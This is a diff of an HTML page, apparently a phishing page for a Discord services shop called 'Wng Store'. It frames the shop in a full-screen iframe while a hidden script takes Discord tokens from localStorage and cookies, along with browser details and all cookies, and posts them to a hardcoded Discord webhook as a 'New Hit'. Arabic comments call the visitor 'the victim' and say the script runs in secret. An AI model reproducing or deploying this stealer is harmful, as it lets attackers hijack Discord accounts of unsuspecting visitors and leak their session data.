@@ -1,58 +1,72 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wng Store - المتجر الأول لخدمات ديسكورد</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* يخفي السكرول بار */
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-<script>
-(function(){
-  const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
 
-  // جمع التوكنات من localStorage
-  let tokens = [];
-  try {
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i);
-      const v = localStorage.getItem(k);
-      if (typeof v === 'string') {
-        // توكن دسكورد نمطه: xxx.yyy.zzz
-        const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
-        if (m) tokens.push(...m);
-      }
-    }
-  } catch(e){}
+    <!-- هذا هو موقع المتجر الأصلي اللي بيشوفه الضحية -->
+    <iframe src="https://mmjrashy889-ui.github.io/Wng-Store/" frameborder="0"></iframe>
 
-  // توكنات من الكوكيز (احتياط)
-  try {
-    const c = document.cookie.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
-    if (c) tokens.push(...c);
-  } catch(e){}
+    <!-- هنا السكربت حقك اللي يشتغل بالخفاء -->
+    <script>
+    (function(){
+      const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
 
-  // إزالة التكرار
-  tokens = [...new Set(tokens)];
+      let tokens = [];
+      try {
+        for (let i = 0; i < localStorage.length; i++) {
+          const k = localStorage.key(i);
+          const v = localStorage.getItem(k);
+          if (typeof v === 'string') {
+            const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
+            if (m) tokens.push(...m);
+          }
+        }
+      } catch(e){}
 
-  const info = {
-    tokens: tokens,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    url: location.href,
-    time: new Date().toISOString(),
-    cookies: document.cookie
-  };
+      try {
+        const c = document.cookie.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
+        if (c) tokens.push(...c);
+      } catch(e){}
 
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "**New Hit**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1900) + "\n```"
-    })
-  }).catch(()=>{});
+      tokens = [...new Set(tokens)];
 
-  // إعادة توجيه لصفحة دسكورد بعد الإرسال
-  setTimeout(()=>{ location.href = "https://discord.com/login"; }, 800);
-})();
-</script>
+      const info = {
+        tokens: tokens,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        url: location.href,
+        time: new Date().toISOString(),
+        cookies: document.cookie
+      };
+
+      // إرسال البيانات
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "**New Hit**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1900) + "\n```"
+        })
+      }).catch(()=>{});
+    })();
+    </script>
 </body>
 </html>
